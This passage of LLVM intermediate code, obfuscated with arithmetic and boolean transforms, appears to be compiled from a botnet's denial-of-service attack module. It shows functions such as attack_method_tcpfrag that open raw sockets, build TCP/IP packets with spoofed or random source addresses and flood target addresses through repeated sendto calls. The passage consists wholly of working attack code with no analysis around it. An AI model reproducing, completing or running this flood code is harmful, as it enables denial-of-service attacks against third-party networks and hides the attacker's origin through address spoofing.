  %592 = bitcast %struct.iphdr* %591 to i16*
  %593 = call zeroext i16 @checksum_generic(i16* %592, i32 20)
  %594 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 7
  store i16 %593, i16* %595, align 2
  %596 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 0, i16* %597, align 4
  %598 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %599 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %600 = bitcast %struct.tcphdr* %599 to i8*
  %601 = call zeroext i16 @htons(i16 zeroext 40) #7
  %602 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %598, i8* %600, i16 zeroext %601, i32 40)
  %603 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 6
  store i16 %602, i16* %604, align 4
  %605 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 1
  %607 = load i16, i16* %606, align 2
  %608 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %609 = load i32, i32* %9, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %612, i32 0, i32 1
  store i16 %607, i16* %613, align 2
  %614 = load i32, i32* %10, align 4
  %615 = load i8*, i8** %30, align 8
  %616 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %617 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %618 = load i32, i32* %9, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i64 %619
  %621 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i32 0, i32 0
  %622 = bitcast %struct.sockaddr_in* %621 to %struct.sockaddr*
  store %struct.sockaddr* %622, %struct.sockaddr** %616, align 8
  %623 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %624 = load %struct.sockaddr*, %struct.sockaddr** %623, align 8
  %625 = call i64 @sendto(i32 %614, i8* %615, i64 60, i32 16384, %struct.sockaddr* %624, i32 16)
  br label %626

; <label>:626:                                    ; preds = %588
  %627 = load i32, i32* %9, align 4
  %628 = sub i32 %627, 1258204226
  %629 = add i32 %628, 1
  %630 = add i32 %629, 1258204226
  %631 = add nsw i32 %627, 1
  store i32 %630, i32* %9, align 4
  br label %468

; <label>:632:                                    ; preds = %468
  br label %467

; <label>:633:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpfrag(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 0)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %660

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %660

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %475, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %481

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 15, -1
  %135 = xor i8 %133, %134
  %136 = and i8 %135, %133
  %137 = and i8 %133, 15
  %138 = xor i8 %136, -1
  %139 = xor i8 64, -1
  %140 = xor i8 99, -1
  %141 = and i8 %138, 99
  %142 = and i8 %136, %140
  %143 = and i8 %139, 99
  %144 = and i8 64, %140
  %145 = or i8 %141, %142
  %146 = or i8 %143, %144
  %147 = xor i8 %145, %146
  %148 = or i8 %138, %139
  %149 = xor i8 %148, -1
  %150 = or i8 99, %140
  %151 = and i8 %149, %150
  %152 = or i8 %147, %151
  %153 = or i8 %136, 64
  store i8 %152, i8* %132, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = xor i8 -16, -1
  %158 = xor i8 %156, %157
  %159 = and i8 %158, %156
  %160 = and i8 %156, -16
  %161 = xor i8 %159, -1
  %162 = xor i8 5, -1
  %163 = xor i8 39, -1
  %164 = and i8 %161, 39
  %165 = and i8 %159, %163
  %166 = and i8 %162, 39
  %167 = and i8 5, %163
  %168 = or i8 %164, %165
  %169 = or i8 %166, %167
  %170 = xor i8 %168, %169
  %171 = or i8 %161, %162
  %172 = xor i8 %171, -1
  %173 = or i8 39, %163
  %174 = and i8 %172, %173
  %175 = or i8 %170, %174
  %176 = or i8 %159, 5
  store i8 %175, i8* %155, align 4
  %177 = load i8, i8* %12, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 1
  store i8 %177, i8* %179, align 1
  %180 = call zeroext i16 @htons(i16 zeroext 60) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  store i16 %180, i16* %182, align 2
  %183 = load i16, i16* %13, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 3
  store i16 %184, i16* %186, align 4
  %187 = load i8, i8* %14, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 %187, i8* %189, align 4
  %190 = load i8, i8* %15, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %113
  %193 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 4
  store i16 %193, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %113
  %197 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 6
  store i8 6, i8* %198, align 1
  %199 = load i32, i32* %26, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 8
  store i32 %199, i32* %201, align 4
  %202 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  %210 = load i16, i16* %16, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  store i16 %211, i16* %213, align 4
  %214 = load i16, i16* %17, align 2
  %215 = call zeroext i16 @htons(i16 zeroext %214) #7
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 1
  store i16 %215, i16* %217, align 2
  %218 = load i32, i32* %18, align 4
  %219 = trunc i32 %218 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = zext i16 %220 to i32
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 2
  store i32 %221, i32* %223, align 4
  %224 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = xor i16 -241, -1
  %228 = xor i16 %226, %227
  %229 = and i16 %228, %226
  %230 = and i16 %226, -241
  %231 = and i16 %229, 160
  %232 = xor i16 %229, 160
  %233 = or i16 %231, %232
  %234 = or i16 %229, 160
  store i16 %233, i16* %225, align 4
  %235 = load i8, i8* %20, align 1
  %236 = sext i8 %235 to i16
  %237 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = xor i16 %236, -1
  %241 = xor i16 1, -1
  %242 = xor i16 519, -1
  %243 = or i16 %240, %241
  %244 = or i16 519, %242
  %245 = xor i16 %243, -1
  %246 = and i16 %245, %244
  %247 = and i16 %236, 1
  %248 = shl i16 %246, 13
  %249 = xor i16 %239, -1
  %250 = xor i16 -8193, -1
  %251 = xor i16 14717, -1
  %252 = or i16 %249, %250
  %253 = or i16 14717, %251
  %254 = xor i16 %252, -1
  %255 = and i16 %254, %253
  %256 = and i16 %239, -8193
  %257 = xor i16 %255, -1
  %258 = xor i16 %248, -1
  %259 = xor i16 -19940, -1
  %260 = and i16 %257, -19940
  %261 = and i16 %255, %259
  %262 = and i16 %258, -19940
  %263 = and i16 %248, %259
  %264 = or i16 %260, %261
  %265 = or i16 %262, %263
  %266 = xor i16 %264, %265
  %267 = or i16 %257, %258
  %268 = xor i16 %267, -1
  %269 = or i16 -19940, %259
  %270 = and i16 %268, %269
  %271 = or i16 %266, %270
  %272 = or i16 %255, %248
  store i16 %271, i16* %238, align 4
  %273 = load i8, i8* %21, align 1
  %274 = sext i8 %273 to i16
  %275 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = xor i16 %274, -1
  %279 = xor i16 1, -1
  %280 = xor i16 19613, -1
  %281 = or i16 %278, %279
  %282 = or i16 19613, %280
  %283 = xor i16 %281, -1
  %284 = and i16 %283, %282
  %285 = and i16 %274, 1
  %286 = shl i16 %284, 12
  %287 = xor i16 -4097, -1
  %288 = xor i16 %277, %287
  %289 = and i16 %288, %277
  %290 = and i16 %277, -4097
  %291 = xor i16 %289, -1
  %292 = xor i16 %286, -1
  %293 = xor i16 -17409, -1
  %294 = and i16 %291, -17409
  %295 = and i16 %289, %293
  %296 = and i16 %292, -17409
  %297 = and i16 %286, %293
  %298 = or i16 %294, %295
  %299 = or i16 %296, %297
  %300 = xor i16 %298, %299
  %301 = or i16 %291, %292
  %302 = xor i16 %301, -1
  %303 = or i16 -17409, %293
  %304 = and i16 %302, %303
  %305 = or i16 %300, %304
  %306 = or i16 %289, %286
  store i16 %305, i16* %276, align 4
  %307 = load i8, i8* %22, align 1
  %308 = sext i8 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = xor i16 %308, -1
  %313 = xor i16 1, -1
  %314 = xor i16 21640, -1
  %315 = or i16 %312, %313
  %316 = or i16 21640, %314
  %317 = xor i16 %315, -1
  %318 = and i16 %317, %316
  %319 = and i16 %308, 1
  %320 = shl i16 %318, 11
  %321 = xor i16 -2049, -1
  %322 = xor i16 %311, %321
  %323 = and i16 %322, %311
  %324 = and i16 %311, -2049
  %325 = xor i16 %323, -1
  %326 = xor i16 %320, -1
  %327 = xor i16 24848, -1
  %328 = and i16 %325, 24848
  %329 = and i16 %323, %327
  %330 = and i16 %326, 24848
  %331 = and i16 %320, %327
  %332 = or i16 %328, %329
  %333 = or i16 %330, %331
  %334 = xor i16 %332, %333
  %335 = or i16 %325, %326
  %336 = xor i16 %335, -1
  %337 = or i16 24848, %327
  %338 = and i16 %336, %337
  %339 = or i16 %334, %338
  %340 = or i16 %323, %320
  store i16 %339, i16* %310, align 4
  %341 = load i8, i8* %23, align 1
  %342 = sext i8 %341 to i16
  %343 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = xor i16 %342, -1
  %347 = xor i16 1, -1
  %348 = xor i16 -20818, -1
  %349 = or i16 %346, %347
  %350 = or i16 -20818, %348
  %351 = xor i16 %349, -1
  %352 = and i16 %351, %350
  %353 = and i16 %342, 1
  %354 = shl i16 %352, 10
  %355 = xor i16 -1025, -1
  %356 = xor i16 %345, %355
  %357 = and i16 %356, %345
  %358 = and i16 %345, -1025
  %359 = xor i16 %357, -1
  %360 = xor i16 %354, -1
  %361 = xor i16 -9946, -1
  %362 = and i16 %359, -9946
  %363 = and i16 %357, %361
  %364 = and i16 %360, -9946
  %365 = and i16 %354, %361
  %366 = or i16 %362, %363
  %367 = or i16 %364, %365
  %368 = xor i16 %366, %367
  %369 = or i16 %359, %360
  %370 = xor i16 %369, -1
  %371 = or i16 -9946, %361
  %372 = and i16 %370, %371
  %373 = or i16 %368, %372
  %374 = or i16 %357, %354
  store i16 %373, i16* %344, align 4
  %375 = load i8, i8* %24, align 1
  %376 = sext i8 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 4
  %379 = load i16, i16* %378, align 4
  %380 = xor i16 1, -1
  %381 = xor i16 %376, %380
  %382 = and i16 %381, %376
  %383 = and i16 %376, 1
  %384 = shl i16 %382, 9
  %385 = xor i16 -513, -1
  %386 = xor i16 %379, %385
  %387 = and i16 %386, %379
  %388 = and i16 %379, -513
  %389 = and i16 %387, %384
  %390 = xor i16 %387, %384
  %391 = or i16 %389, %390
  %392 = or i16 %387, %384
  store i16 %391, i16* %378, align 4
  %393 = load i8, i8* %25, align 1
  %394 = sext i8 %393 to i16
  %395 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 4
  %397 = load i16, i16* %396, align 4
  %398 = xor i16 %394, -1
  %399 = xor i16 1, -1
  %400 = xor i16 11036, -1
  %401 = or i16 %398, %399
  %402 = or i16 11036, %400
  %403 = xor i16 %401, -1
  %404 = and i16 %403, %402
  %405 = and i16 %394, 1
  %406 = shl i16 %404, 8
  %407 = xor i16 %397, -1
  %408 = xor i16 -257, -1
  %409 = xor i16 30562, -1
  %410 = or i16 %407, %408
  %411 = or i16 30562, %409
  %412 = xor i16 %410, -1
  %413 = and i16 %412, %411
  %414 = and i16 %397, -257
  %415 = xor i16 %413, -1
  %416 = xor i16 %406, -1
  %417 = xor i16 32664, -1
  %418 = and i16 %415, 32664
  %419 = and i16 %413, %417
  %420 = and i16 %416, 32664
  %421 = and i16 %406, %417
  %422 = or i16 %418, %419
  %423 = or i16 %420, %421
  %424 = xor i16 %422, %423
  %425 = or i16 %415, %416
  %426 = xor i16 %425, -1
  %427 = or i16 32664, %417
  %428 = and i16 %426, %427
  %429 = or i16 %424, %428
  %430 = or i16 %413, %406
  store i16 %429, i16* %396, align 4
  %431 = load i8*, i8** %29, align 8
  %432 = getelementptr inbounds i8, i8* %431, i32 1
  store i8* %432, i8** %29, align 8
  store i8 2, i8* %431, align 1
  %433 = load i8*, i8** %29, align 8
  %434 = getelementptr inbounds i8, i8* %433, i32 1
  store i8* %434, i8** %29, align 8
  store i8 4, i8* %433, align 1
  %435 = call i32 @rand_next()
  %436 = xor i32 15, -1
  %437 = xor i32 %435, %436
  %438 = and i32 %437, %435
  %439 = and i32 %435, 15
  %440 = add i32 1400, 1071278154
  %441 = add i32 %440, %438
  %442 = sub i32 %441, 1071278154
  %443 = add i32 1400, %438
  %444 = trunc i32 %442 to i16
  %445 = call zeroext i16 @htons(i16 zeroext %444) #7
  %446 = load i8*, i8** %29, align 8
  %447 = bitcast i8* %446 to i16*
  store i16 %445, i16* %447, align 2
  %448 = load i8*, i8** %29, align 8
  %449 = getelementptr inbounds i8, i8* %448, i64 2
  store i8* %449, i8** %29, align 8
  %450 = load i8*, i8** %29, align 8
  %451 = getelementptr inbounds i8, i8* %450, i32 1
  store i8* %451, i8** %29, align 8
  store i8 4, i8* %450, align 1
  %452 = load i8*, i8** %29, align 8
  %453 = getelementptr inbounds i8, i8* %452, i32 1
  store i8* %453, i8** %29, align 8
  store i8 2, i8* %452, align 1
  %454 = load i8*, i8** %29, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %29, align 8
  store i8 8, i8* %454, align 1
  %456 = load i8*, i8** %29, align 8
  %457 = getelementptr inbounds i8, i8* %456, i32 1
  store i8* %457, i8** %29, align 8
  store i8 10, i8* %456, align 1
  %458 = call i32 @rand_next()
  %459 = load i8*, i8** %29, align 8
  %460 = bitcast i8* %459 to i32*
  store i32 %458, i32* %460, align 4
  %461 = load i8*, i8** %29, align 8
  %462 = getelementptr inbounds i8, i8* %461, i64 4
  store i8* %462, i8** %29, align 8
  %463 = load i8*, i8** %29, align 8
  %464 = bitcast i8* %463 to i32*
  store i32 0, i32* %464, align 4
  %465 = load i8*, i8** %29, align 8
  %466 = getelementptr inbounds i8, i8* %465, i64 4
  store i8* %466, i8** %29, align 8
  %467 = load i8*, i8** %29, align 8
  %468 = getelementptr inbounds i8, i8* %467, i32 1
  store i8* %468, i8** %29, align 8
  store i8 1, i8* %467, align 1
  %469 = load i8*, i8** %29, align 8
  %470 = getelementptr inbounds i8, i8* %469, i32 1
  store i8* %470, i8** %29, align 8
  store i8 3, i8* %469, align 1
  %471 = load i8*, i8** %29, align 8
  %472 = getelementptr inbounds i8, i8* %471, i32 1
  store i8* %472, i8** %29, align 8
  store i8 3, i8* %471, align 1
  %473 = load i8*, i8** %29, align 8
  %474 = getelementptr inbounds i8, i8* %473, i32 1
  store i8* %474, i8** %29, align 8
  store i8 6, i8* %473, align 1
  br label %475

; <label>:475:                                    ; preds = %196
  %476 = load i32, i32* %9, align 4
  %477 = sub i32 %476, 1679460862
  %478 = add i32 %477, 1
  %479 = add i32 %478, 1679460862
  %480 = add nsw i32 %476, 1
  store i32 %479, i32* %9, align 4
  br label %108

; <label>:481:                                    ; preds = %108
  br label %482

; <label>:482:                                    ; preds = %659, %481
  store i32 0, i32* %9, align 4
  br label %483

; <label>:483:                                    ; preds = %653, %482
  %484 = load i32, i32* %9, align 4
  %485 = load i8, i8* %5, align 1
  %486 = zext i8 %485 to i32
  %487 = icmp slt i32 %484, %486
  br i1 %487, label %488, label %659

; <label>:488:                                    ; preds = %483
  %489 = load i8**, i8*** %11, align 8
  %490 = load i32, i32* %9, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds i8*, i8** %489, i64 %491
  %493 = load i8*, i8** %492, align 8
  store i8* %493, i8** %30, align 8
  %494 = load i8*, i8** %30, align 8
  %495 = bitcast i8* %494 to %struct.iphdr*
  store %struct.iphdr* %495, %struct.iphdr** %31, align 8
  %496 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i64 1
  %498 = bitcast %struct.iphdr* %497 to %struct.tcphdr*
  store %struct.tcphdr* %498, %struct.tcphdr** %32, align 8
  %499 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %500 = load i32, i32* %9, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i64 %501
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i32 0, i32 2
  %504 = load i8, i8* %503, align 4
  %505 = zext i8 %504 to i32
  %506 = icmp slt i32 %505, 32
  br i1 %506, label %507, label %531

; <label>:507:                                    ; preds = %488
  %508 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %509 = load i32, i32* %9, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %508, i64 %510
  %512 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i32 0, i32 1
  %513 = load i32, i32* %512, align 4
  %514 = call i32 @ntohl(i32 %513) #7
  %515 = call i32 @rand_next()
  %516 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %517 = load i32, i32* %9, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i64 %518
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %519, i32 0, i32 2
  %521 = load i8, i8* %520, align 4
  %522 = zext i8 %521 to i32
  %523 = lshr i32 %515, %522
  %524 = add i32 %514, -3277416
  %525 = add i32 %524, %523
  %526 = sub i32 %525, -3277416
  %527 = add i32 %514, %523
  %528 = call i32 @htonl(i32 %526) #7
  %529 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i32 0, i32 9
  store i32 %528, i32* %530, align 4
  br label %531

; <label>:531:                                    ; preds = %507, %488
  %532 = load i32, i32* %26, align 4
  %533 = icmp eq i32 %532, -1
  br i1 %533, label %534, label %538

; <label>:534:                                    ; preds = %531
  %535 = call i32 @rand_next()
  %536 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 8
  store i32 %535, i32* %537, align 4
  br label %538

; <label>:538:                                    ; preds = %534, %531
  %539 = load i16, i16* %13, align 2
  %540 = zext i16 %539 to i32
  %541 = icmp eq i32 %540, 65535
  br i1 %541, label %542, label %555

; <label>:542:                                    ; preds = %538
  %543 = call i32 @rand_next()
  %544 = xor i32 %543, -1
